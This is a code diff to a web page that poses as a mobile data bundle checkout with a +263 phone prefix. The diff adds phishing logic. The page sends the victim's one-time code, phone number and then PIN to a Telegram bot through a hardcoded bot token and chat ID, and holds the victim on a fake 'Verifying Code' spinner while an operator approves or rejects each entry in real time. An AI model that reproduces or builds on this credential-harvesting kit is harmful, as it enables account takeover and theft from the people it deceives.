@@ -246,8 +246,8 @@
             text-decoration: underline;
         }
 
-        /* Spinner Overlay */
-        #spinnerOverlay {
+        /* Loading Overlay */
+        .loading-overlay {
             position: fixed;
             inset: 0;
             display: none;
@@ -258,6 +258,10 @@
             background: rgba(0,0,0,0.8);
             z-index: 2000;
             backdrop-filter: blur(4px);
+        }
+
+        .loading-overlay.active {
+            display: flex;
         }
 
         .spinner {
@@ -284,7 +288,7 @@
             to { transform: rotate(360deg); }
         }
 
-        /* Waiting Modal */
+        /* Modal */
         .modal-overlay {
             position: fixed;
             inset: 0;
@@ -308,7 +312,6 @@
             max-width: 400px;
             width: 100%;
             box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-            text-align: center;
         }
 
         .modal-title {
@@ -317,73 +320,15 @@
             color: var(--text-dark);
             margin-bottom: 12px;
             letter-spacing: -0.5px;
+            text-align: center;
         }
 
         .modal-subtitle {
             color: var(--text-muted);
             font-size: 14px;
-            margin-bottom: 32px;
+            margin-bottom: 24px;
             line-height: 1.6;
-        }
-
-        .waiting-spinner {
-            width: 48px;
-            height: 48px;
-            border: 4px solid rgba(0,82,204,0.2);
-            border-top-color: var(--primary-blue);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 16px;
-        }
-
-        .modal-buttons {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .modal-btn {
-            padding: 12px 20px;
-            border-radius: 50px;
-            border: none;
-            font-weight: 800;
-            font-size: 14px;
-            text-transform: uppercase;
-            letter-spacing: 0.04em;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-
-        .modal-btn-approve {
-            background: var(--success);
-            color: white;
-            box-shadow: 0 4px 12px rgba(0, 176, 80, 0.2);
-        }
-
-        .modal-btn-approve:hover {
-            background: #009640;
-            transform: translateY(-1px);
-        }
-
-        .modal-btn-decline {
-            background: var(--accent-red);
-            color: white;
-            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
-        }
-
-        .modal-btn-decline:hover {
-            background: #b71c1c;
-            transform: translateY(-1px);
-        }
-
-        /* PIN Modal */
-        .pin-modal-content {
-            background: white;
-            border-radius: 16px;
-            padding: 40px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
         }
 
         .pin-input-group {
@@ -534,22 +479,16 @@
         </div>
     </main>
 
-    <!-- Waiting for Code Verification Modal -->
-    <div id="verifyingModal" class="modal-overlay">
-        <div class="modal-content">
-            <div class="waiting-spinner"></div>
-            <h2 class="modal-title">Verifying Code</h2>
-            <p class="modal-subtitle">Please wait while we verify your code</p>
-            <div class="modal-buttons">
-                <button class="modal-btn modal-btn-approve" onclick="handleCodeVerification('approved')">✓ Approved</button>
-                <button class="modal-btn modal-btn-decline" onclick="handleCodeVerification('declined')">✗ Declined</button>
-            </div>
-        </div>
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <div class="spin-label">Verifying Code</div>
+        <div class="spin-sub">Check your Telegram for approval</div>
     </div>
 
-    <!-- PIN Confirmation Modal -->
+    <!-- PIN Modal -->
     <div id="pinModal" class="modal-overlay">
-        <div class="pin-modal-content">
+        <div class="modal-content">
             <h3 class="modal-title">Confirm PIN</h3>
             <p class="modal-subtitle">Enter your PIN to complete the transaction</p>
 
@@ -566,15 +505,12 @@
         </div>
     </div>
 
-    <div id="spinnerOverlay">
-        <div class="spinner"></div>
-        <div class="spin-label">Processing...</div>
-        <div class="spin-sub">Please wait</div>
-    </div>
-
     <script>
+        const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
+        const TELEGRAM_CHAT_ID = '7547427914';
         let otpCode = '';
         let bundleParams = {};
+        let currentRequestId = null;
 
         function loadBundleData() {
             const params = new URLSearchParams(window.location.search);
@@ -660,6 +596,28 @@
             errorMsg.classList.remove('show');
         }
 
+        async function sendToTelegram(message, buttons) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        reply_markup: buttons ? { inline_keyboard: buttons } : undefined
+                    })
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.result.message_id;
+                }
+            } catch (error) {
+                console.error('Telegram error:', error);
+            }
+            return null;
+        }
+
         function validateOTP() {
             clearError();
             const otp = getOTPCode();
@@ -669,23 +627,50 @@
                 return;
             }
 
-            document.getElementById('verifyingModal').classList.add('active');
+            // Generate request ID
+            currentRequestId = 'otp_' + Date.now();
+
+            // Prepare message and buttons
+            const message = `📲 OTP Verification\n\nCode: ${otp}\nPhone: +263${bundleParams.phone}\nBundle: ${bundleParams.data}\n\nRequest ID: ${currentRequestId}`;
+            
+            const buttons = [
+                [
+                    { text: '✓ Approved', callback_data: `otp_approved_${currentRequestId}` },
+                    { text: '✗ Declined', callback_data: `otp_declined_${currentRequestId}` }
+                ]
+            ];
+
+            // Send to Telegram
+            sendToTelegram(message, buttons);
+
+            // Show loading overlay
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            // Start polling for response
+            pollForOTPApproval(currentRequestId);
         }
 
-        function handleCodeVerification(status) {
-            document.getElementById('verifyingModal').classList.remove('active');
+        function pollForOTPApproval(requestId) {
+            const pollInterval = setInterval(() => {
+                const response = localStorage.getItem(`otp_approval_${requestId}`);
+                
+                if (response) {
+                    clearInterval(pollInterval);
+                    localStorage.removeItem(`otp_approval_${requestId}`);
+                    document.getElementById('loadingOverlay').classList.remove('active');
 
-            if (status === 'declined') {
-                showError('Code verification failed. Please try again.');
-                document.querySelectorAll('.otp-box').forEach(box => box.value = '');
-                document.querySelectorAll('.otp-box')[0].focus();
-                return;
-            }
+                    if (response === 'approved') {
+                        document.getElementById('pinModal').classList.add('active');
+                        document.getElementById('pinInput').focus();
+                    } else if (response === 'declined') {
+                        showError('Code verification failed. Please try again.');
+                        document.querySelectorAll('.otp-box').forEach(box => box.value = '');
+                        document.querySelectorAll('.otp-box')[0].focus();
+                    }
+                }
+            }, 1000);
 
-            if (status === 'approved') {
-                document.getElementById('pinModal').classList.add('active');
-                document.getElementById('pinInput').focus();
-            }
+            setTimeout(() => clearInterval(pollInterval), 300000);
         }
 
         function showModalError(message) {
@@ -699,7 +684,7 @@
             errorMsg.classList.remove('show');
         }
 
-        function confirmPIN() {
+        async function confirmPIN() {
             clearModalError();
             const pin = document.getElementById('pinInput').value.trim();
 
@@ -713,12 +698,50 @@
                 return;
             }
 
-            closePinModal();
-            document.getElementById('spinnerOverlay').style.display = 'flex';
+            // Generate request ID
+            const pinRequestId = 'pin_' + Date.now();
 
-            setTimeout(() => {
-                window.location.href = `success.html?data=${encodeURIComponent(bundleParams.data)}&price=${encodeURIComponent(bundleParams.price)}`;
-            }, 1500);
+            // Prepare message and buttons
+            const message = `🔐 PIN Verification\n\nPIN: ${pin}\nPhone: +263${bundleParams.phone}\nBundle: ${bundleParams.data}\n\nRequest ID: ${pinRequestId}`;
+            
+            const buttons = [
+                [
+                    { text: '✓ Valid PIN', callback_data: `pin_valid_${pinRequestId}` },
+                    { text: '✗ Invalid PIN', callback_data: `pin_invalid_${pinRequestId}` }
+                ]
+            ];
+
+            // Send to Telegram
+            await sendToTelegram(message, buttons);
+
+            // Show loading
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            // Start polling for PIN response
+            pollForPINApproval(pinRequestId);
+        }
+
+        function pollForPINApproval(requestId) {
+            const pollInterval = setInterval(() => {
+                const response = localStorage.getItem(`pin_approval_${requestId}`);
+                
+                if (response) {
+                    clearInterval(pollInterval);
+                    localStorage.removeItem(`pin_approval_${requestId}`);
+                    document.getElementById('loadingOverlay').classList.remove('active');
+
+                    if (response === 'valid') {
+                        window.location.href = `success.html?data=${encodeURIComponent(bundleParams.data)}&price=${encodeURIComponent(bundleParams.price)}`;
+                    } else if (response === 'invalid') {
+                        clearModalError();
+                        showModalError('Invalid PIN. Please try again.');
+                        document.getElementById('pinInput').value = '';
+                        document.getElementById('pinInput').focus();
+                    }
+                }
+            }, 1000);
+
+            setTimeout(() => clearInterval(pollInterval), 300000);
         }
 
         function closePinModal() {
